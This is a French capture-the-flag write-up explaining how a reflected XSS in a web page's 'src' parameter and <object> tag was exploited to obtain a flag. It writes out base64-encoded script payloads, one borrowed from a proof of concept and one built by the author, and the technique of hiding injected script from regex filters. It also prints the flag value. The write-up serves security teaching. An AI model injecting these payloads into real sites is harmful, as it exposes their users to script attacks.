### Comment obtenir le flag
Depuis la page d'accueil, il y a lien vers la page `?page=media&src=nsa`. Cette page comporte un logo (modifié) de la NSA. En examinant le code source, on s'aperçoit que cette image ne provient pas d'une balise `<img>` (comme la plupart des autres images du site) ou d'une classe CSS (comme les icones font awesome), mais d'une balise `<object>`.  
La documentation [MDN sur cette balise](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) nous précise qu'elle doit contenir au moins un attribut `data` et un attribut `type`. Or celle du site ne contient qu'un attribut `data` ; il pourrait donc être possible d'exploiter cet oubli.  
Une recherche rapide nous amène vers un [*proof of concept*](https://bugzilla.mozilla.org/show_bug.cgi?id=530308#c27) :
```
<object
data="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="
type="image/svg+xml"></object>
```
En [décodant le contenu en base64](https://base64.guru/converter/decode), on obtient :
```
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss"><script type="text/ecmascript">alert("XSS");</script></svg>
```

Nous allons produire notre propre exploit :
```
<script>alert("WARING!");</script>
```
Ce qui une fois [encodé en base64](https://base64.guru/converter/encode) devient :
```
PHNjcmlwdD5hbGVydCgiV0FSSU5HISIpOzwvc2NyaXB0Pg==
```
Avec l'entête, on arrive au *payload* suivant :
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiV0FSSU5HISIpOzwvc2NyaXB0Pg==
```

En insérant ce contenu dans l'attribut `data`, nous arrivons bien à afficher le popup. Mais pas à obtenir le flag...  
En continuant à chercher, on s'aperçoit qu'en modifiant le paramètre GET `src` dans l'URL, on obtient le message « *Sorry wrong answer* ». On essaie donc de mettre notre *payload* dans `src` : bingo ! On débloque le flag `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`.

### Expliquer la faille
L'intérêt de l'encodage en base64 est de dissimuler le code injecté (ce qui peut suffire à contourner la protection s'il s'agit d'une simple expression régulière sur `<script>`).  
Le problème de cette faille est surtout que le contenu envoyé dans le paramètre GET `src` risque d'être interprété sur la page, et qu'il serait donc possible de piéger un utilisateur avec un lien en apparence sûr (puisque provenant d'un site de confiance) mais contenant du contenu malveillant dans `src`.  

### Comment la corriger
Il faut toujours valider et filtrer tout contenu provenant de l'utilisateur, et ne jamais exécuter du contenu dont on n'est pas certain de l'origine.